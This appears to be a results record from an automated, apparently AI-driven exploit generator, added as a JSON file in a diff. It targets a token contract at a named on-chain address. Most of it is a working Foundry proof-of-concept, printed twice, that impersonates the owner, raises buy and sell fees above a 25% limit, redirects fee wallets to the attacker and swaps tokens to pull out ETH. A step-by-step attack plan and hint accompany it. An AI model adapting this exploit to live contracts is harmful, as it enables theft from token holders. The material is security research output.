@@ -1,0 +1,61 @@
+{
+  "project_id": "2-marvin",
+  "target_address": "0x55a380d134d722006A5CE2d510562e1239D225B1",
+  "finding_id": 0,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0x55a380d134d722006A5CE2d510562e1239D225B1",
+    "vulnerability_type": "Exceeds Fees Limit",
+    "violation_category": "ECONOMIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner (or gain owner privileges)",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "token_balance",
+        "description": "Attacker must hold some MARVIN tokens to demonstrate the exploit",
+        "token_address": "0x55a380d134d722006A5CE2d510562e1239D225B1",
+        "min_amount": "1000000000000000000"
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "NATIVE",
+        "victim_contract": "0x55a380d134d722006A5CE2d510562e1239D225B1",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "As the contract owner, call updateBuyFees() or updateSellFees() with values that sum to >25% (e.g., 26% each). Then perform a token swap through the Uniswap pair to trigger the excessive fee collection. The high fees will be collected in the contract and later distributed to marketing and dev wallets (which can be controlled by the owner). Ensure trading is enabled first via enableTrading() if not already active."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// Minimal interface for IUniswapV2Router02 functions we need\ninterface IUniswapV2Router02 {\n    function WETH() external pure returns (address);\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\n// Interface for ERC20 approve\ninterface IERC20 {\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\n// Interface for MarvinInu to access owner and router\ninterface MarvinInu {\n    function owner() external view returns (address);\n    function enableTrading() external;\n    function updateBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external;\n    function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external;\n    function updateMarketingWallet(address newMarketingWallet) external;\n    function updateDevWallet(address newWallet) external;\n    function uniswapV2Router() external view returns (address);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;\n    address attacker = address(this);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll use vm.prank to impersonate owner\n        // The test file already defines TARGET and attacker\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Store initial ETH balance\n        uint256 initialBalance = address(this).balance;\n        \n        // Get the owner address from the contract\n        MarvinInu target = MarvinInu(TARGET);\n        address owner = target.owner();\n        \n        // Impersonate the owner\n        vm.startPrank(owner);\n        \n        // Enable trading if not already enabled (call won't fail if already enabled)\n        target.enableTrading();\n        \n        // Set buy fees to 26% (exceeds 25% limit)\n        target.updateBuyFees(10, 10, 6); // 10 + 10 + 6 = 26%\n        \n        // Set sell fees to 26%\n        target.updateSellFees(10, 10, 6); // 10 + 10 + 6 = 26%\n        \n        // Update marketing and dev wallets to attacker address\n        target.updateMarketingWallet(attacker);\n        target.updateDevWallet(attacker);\n        \n        vm.stopPrank();\n        \n        // Get some MARVIN tokens as required by precondition\n        deal(TARGET, attacker, 1000 * 10**18);\n        \n        // Approve router to spend our tokens\n        IERC20(TARGET).approve(address(target.uniswapV2Router()), type(uint256).max);\n        \n        // Perform a swap to trigger fee collection\n        // We'll swap a small amount to avoid hitting max transaction limits\n        uint256 amountToSwap = 100 * 10**18;\n        \n        // Get router address from the contract\n        address routerAddress = address(target.uniswapV2Router());\n        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);\n        \n        // Create path for swap: MARVIN -> WETH\n        address[] memory path = new address[](2);\n        path[0] = TARGET;\n        path[1] = router.WETH();\n        \n        // Perform the swap\n        vm.prank(attacker);\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            amountToSwap,\n            0, // accept any amount of ETH\n            path,\n            attacker,\n            block.timestamp\n        );\n        \n        // Check that our ETH balance increased\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The contract allows setting fees up to 50% but there's an implicit 25% limit being violated. As owner, we can set excessive fees (>25%), then trigger fee collection via a swap. Since we control marketing/dev wallets, we receive the collected ETH.",
+      "attack_strategy": "Impersonate owner, set fees to 26% each, update wallets to attacker, perform swap to trigger fee collection, profit from ETH distribution.",
+      "step_by_step_plan": "1. Impersonate owner via vm.prank\n2. Enable trading if needed\n3. Set buy fees to 26% (e.g., 10 marketing, 10 liquidity, 6 dev)\n4. Set sell fees to 26% similarly\n5. Update marketing and dev wallets to attacker address\n6. Get MARVIN tokens via deal()\n7. Approve router for token spending\n8. Perform swapExactTokensForETH to trigger sell fees\n9. Check ETH balance increased",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// Minimal interface for IUniswapV2Router02 functions we need\ninterface IUniswapV2Router02 {\n    function WETH() external pure returns (address);\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\n// Interface for ERC20 approve\ninterface IERC20 {\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\n// Interface for MarvinInu to access owner and router\ninterface MarvinInu {\n    function owner() external view returns (address);\n    function enableTrading() external;\n    function updateBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external;\n    function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external;\n    function updateMarketingWallet(address newMarketingWallet) external;\n    function updateDevWallet(address newWallet) external;\n    function uniswapV2Router() external view returns (address);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;\n    address attacker = address(this);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll use vm.prank to impersonate owner\n        // The test file already defines TARGET and attacker\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Store initial ETH balance\n        uint256 initialBalance = address(this).balance;\n        \n        // Get the owner address from the contract\n        MarvinInu target = MarvinInu(TARGET);\n        address owner = target.owner();\n        \n        // Impersonate the owner\n        vm.startPrank(owner);\n        \n        // Enable trading if not already enabled (call won't fail if already enabled)\n        target.enableTrading();\n        \n        // Set buy fees to 26% (exceeds 25% limit)\n        target.updateBuyFees(10, 10, 6); // 10 + 10 + 6 = 26%\n        \n        // Set sell fees to 26%\n        target.updateSellFees(10, 10, 6); // 10 + 10 + 6 = 26%\n        \n        // Update marketing and dev wallets to attacker address\n        target.updateMarketingWallet(attacker);\n        target.updateDevWallet(attacker);\n        \n        vm.stopPrank();\n        \n        // Get some MARVIN tokens as required by precondition\n        deal(TARGET, attacker, 1000 * 10**18);\n        \n        // Approve router to spend our tokens\n        IERC20(TARGET).approve(address(target.uniswapV2Router()), type(uint256).max);\n        \n        // Perform a swap to trigger fee collection\n        // We'll swap a small amount to avoid hitting max transaction limits\n        uint256 amountToSwap = 100 * 10**18;\n        \n        // Get router address from the contract\n        address routerAddress = address(target.uniswapV2Router());\n        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);\n        \n        // Create path for swap: MARVIN -> WETH\n        address[] memory path = new address[](2);\n        path[0] = TARGET;\n        path[1] = router.WETH();\n        \n        // Perform the swap\n        vm.prank(attacker);\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            amountToSwap,\n            0, // accept any amount of ETH\n            path,\n            attacker,\n            block.timestamp\n        );\n        \n        // Check that our ETH balance increased\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 136.4496099948883,
+      "prompt_tokens": 23651,
+      "completion_tokens": 2436,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 136.45449781417847,
+  "total_prompt_tokens": 23651,
+  "total_completion_tokens": 2436,
+  "total_cost": 0.0
+}
